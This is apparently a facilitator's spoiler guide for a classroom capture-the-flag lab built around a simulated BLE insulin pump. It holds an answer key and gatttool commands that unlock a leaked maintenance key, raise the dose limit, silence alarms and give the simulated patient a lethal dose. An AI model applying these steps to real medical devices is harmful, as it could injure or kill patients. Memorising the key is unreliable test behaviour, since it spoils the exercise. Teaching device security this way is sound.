# Facilitator guide — MedSim IP-800  (SPOILERS)

This file contains the solutions. Share **PROFILE.md** with participants, not
this one.

## Idea
A shared, simulated insulin pump with a patient model. Participants attack the
same device over BLE; the projector shows the patient's state live and credits
whoever succeeds. Meant as an extra challenge alongside `ble_ctf`.

## Quick start on the Pi
```bash
./setup.sh
./.venv/bin/python -m src.main --autoreset 30      # pump + dashboard
systemd/kiosk.sh                                    # projector fullscreen
```
Verify the whole chain (from another machine or the second adapter):
```bash
pip install bleak
python3 selftest/attack_client.py --name solution --scenario full
python3 selftest/attack_client.py --name solution --scenario bolus --silence
```
Without BLE (projection test only, on any machine):
```bash
python3 -m src.main --mock            # open http://localhost:8080/?debug
```

## Flag answer key (difficulty ramp)
| Flag | Solution |
|---|---|
| **F1** recon-model | Read Model Number (0x2A24). |
| **F2** read-features | Read IDD Features (0x2B23). |
| **F3** basal-legal | CCP: `01` + `centi(basal)` with basal ≤ 3.0, e.g. `01 C8 00` (2.0 U/h). |
| **F4** hit-interlock | CCP: `01` with basal > the limit, e.g. `01 DC 05` (15 U/h) → clamped. |
| **F5** maint-unlock | Read Firmware (0x2A26) → `maint-key:DEADBEEF`. CCP: `04 DE AD BE EF`. |
| **F6** raise-limit | After unlock, CCP: `03` + `centi(20)` = `03 D0 07`. |
| **F7** overdose-kill | Raise the limit, set basal ~10-12 U/h → glucose < 1.5 in ~1-2 min. |
| **F8** stealth-kill | Send `05 01` (silence alarms) before you kill. |
| **F9** bolus-kill | After raising the limit: CCP `02` + `centi(40)` → bolus crash in ~20 s. |

`centi(x)` = `struct.pack("<H", int(x*100))`. Example: 2.0 U/h → `C8 00`.

### Doing it with gatttool (the workshop tool)
`gatttool` talks raw ATT over L2CAP and works reliably (verified on hardware).
The device advertises a public address, so pass `-t public`. Handles are
allocated by BlueZ and shift if the pump restarts — always discover them with
`--characteristics`, or read by UUID. Reads by UUID are handle-independent:

```bash
MAC=D8:3A:DD:99:2C:57                       # from: sudo hcitool lescan
gatttool -b $MAC -t public --primary                 # list services
gatttool -b $MAC -t public --characteristics         # list chars + handles
gatttool -b $MAC -t public --char-read -u 0x2a24     # Model Number  (F1)
gatttool -b $MAC -t public --char-read -u 0x2a26     # Firmware -> maint-key (F5)
gatttool -b $MAC -t public --char-read -u 0x2b23     # IDD Features  (F2)
# writes need the CCP value handle (0x2b25) from --characteristics, e.g. 0x0032:
CCP=0x0032
gatttool -b $MAC -t public --char-write-req -a $CCP -n 01c800     # F3 basal 2.0
gatttool -b $MAC -t public --char-write-req -a $CCP -n 04deadbeef # F5 unlock
gatttool -b $MAC -t public --char-write-req -a $CCP -n 03d007     # F6 max 20
gatttool -b $MAC -t public --char-write-req -a $CCP -n 0501       # F8 silence
gatttool -b $MAC -t public --char-write-req -a $CCP -n 02a00f     # F7/F9 bolus 40U -> kill
```
`gratttool` (a Rust gatttool reimplementation) is a drop-in with the same
flags, and `bleak` (used by `selftest/attack_client.py`) is a Python option —
both go through BlueZ's **D-Bus** GATT client. They work **only after the Pi
fix below**; without it they fail where gatttool succeeds.

### Important — disable the audio stack on the Pi
On a Pi running a desktop session, **PipeWire registers a BLE MIDI GATT
service** (service UUID `03b80e5a-ede8-4b33-a751-6ce34ec4c700`, I/O
characteristic `7772e5db-…`) whose characteristic **requires encryption**. When
a BlueZ **D-Bus** central (bleak, gratttool, bluetoothctl) connects, it touches
that characteristic during service resolution, gets `Insufficient Encryption
(0x0f)`, escalates to pairing, fails with no bond, and the whole GATT session
collapses — every read/write then returns `Unlikely Error (0x0e)`. `gatttool`
(raw ATT at low security) never touches it, which is exactly why it "just works"
while every D-Bus tool fails. It is **not** a BlueZ-version issue (reproduced on
BlueZ 5.72, 5.82 and 5.87) and **not** our GATT server.

The target is headless and needs no audio, so remove the service by masking the
audio stack:

```bash
XDG_RUNTIME_DIR=/run/user/$(id -u) systemctl --user mask --now \
  pipewire.service pipewire.socket pipewire-pulse.service \
  pipewire-pulse.socket wireplumber.service
```

Verified on hardware (Kali 5.87 central → Pi 5.82 peripheral): after this,
**gatttool, gratttool, bleak and nRF Connect all read and write reliably, with
no pairing**, and the fix persists across reboot. (An alternative that keeps
audio is `bluez5.enable-midi = false` in WirePlumber's Bluetooth config.)

### Flatline death sound (optional)
When the patient dies the pump plays `assets/flatline.wav` on the Pi via ALSA
(`aplay`). This uses the kernel audio path directly, so **masking PipeWire above
does not disable it** — plug a speaker into the Pi's 3.5mm jack and it just
works. The default device is the analog jack (`plughw:CARD=Headphones,DEV=0`);
use `--sound-device plughw:CARD=vc4hdmi0,DEV=0` for HDMI audio, or `--no-sound`
to disable. Regenerate/tweak the sound with `python3 assets/make_flatline.py`.

### Attribution / death
Whoever **last raised the dose** (a basal or bolus increase) is credited with
the death on the scoreboard. F8 is granted if the alarms were silenced when the
patient died; F9 if the last dosing command was a bolus. Set the Player Name
**first** — otherwise an anonymous address is shown. Names/flags follow the BLE
address; if the phone rotates its address you have to set the name again (best
to set the name right after every new connection).

## Model tuning (live-editable in `src/model.py`)
- `FACTORY_BASAL`/`FACTORY_MAX_BASAL` — starting dose and the factory interlock.
- `TAU_I` — time to effect (default 40 s → death in ~1-2 min for the basal scenario).
- `SI`, `P_GLU`, `KG` — glucose equilibrium (`G_eq = P/(KG+SI*I)`).
- Thresholds `G_*` — the color-zone boundaries.
Re-run with `--mock` and press the debug buttons to feel out the pacing.

## BLE operational notes (important)
- **No pairing/bonding needed.** All characteristics are unencrypted, so clients
  just Connect and read/write — confirmed working with nRF Connect on a phone.
  If an OS pops a "Just Works" pairing prompt it can be ignored/cancelled; there
  is no secret PIN. (Old CSR 4.0 USB dongles are flaky as *centrals* on unbonded
  LE links and may drop during service discovery — prefer a phone or a modern
  adapter for the reference client.)
- Requires **BlueZ** and `bluetoothd` running. Check: `systemctl status bluetooth`.
- Peripheral advertising + GATT require the adapter not to be busy with anything
  else. Close any `bluetoothctl` sessions. Power on the adapter:
  `bluetoothctl power on`.
- Some BlueZ versions want `bluetoothd` with `--experimental` for full LE
  advertising. If `RegisterAdvertisement` complains: add `--experimental` in
  `/lib/systemd/system/bluetooth.service` and `systemctl daemon-reload && \
  systemctl restart bluetooth`.
- Run the pump as root **or** grant Python D-Bus permissions for `org.bluez`
  (the systemd unit runs as the user owning WorkingDirectory; easiest is to run
  the service as root during class).
- **Concurrent connections:** several participants can be connected at the same
  time — the pump keeps advertising while connected and the GATT state is shared
  (one patient), so everyone sees the same gauges and every write affects the
  same pump. Confirmed on hardware with two simultaneous centrals (a laptop via
  bleak + a phone via nRF Connect doing Heart Rate notifications). The controller
  accepts a finite number at once (a handful on the Pi); as that fills,
  participants cycle — advertising continues, so a new client can join the moment
  one disconnects, and auto-reset gives a fresh patient.
- The Pi's adapter is used by the pump — so run `attack_client.py` from
  **another** machine, or plug in a USB BT dongle as a second adapter
  (`--adapter hci1`).

## Classroom demo flow
1. Show the projector: patient stable, green. Explain that the pump is a real
   BLE target.
2. Let the fast participants scan, find IDS, read DIS.
3. First to move a gauge → applause. First interlock clamp → show "attack
   blocked" on the screen.
4. Build up to F7: someone unlocks, raises the limit, overdoses → the whole
   class sees "DECEASED". Press **Revive** and run it again.
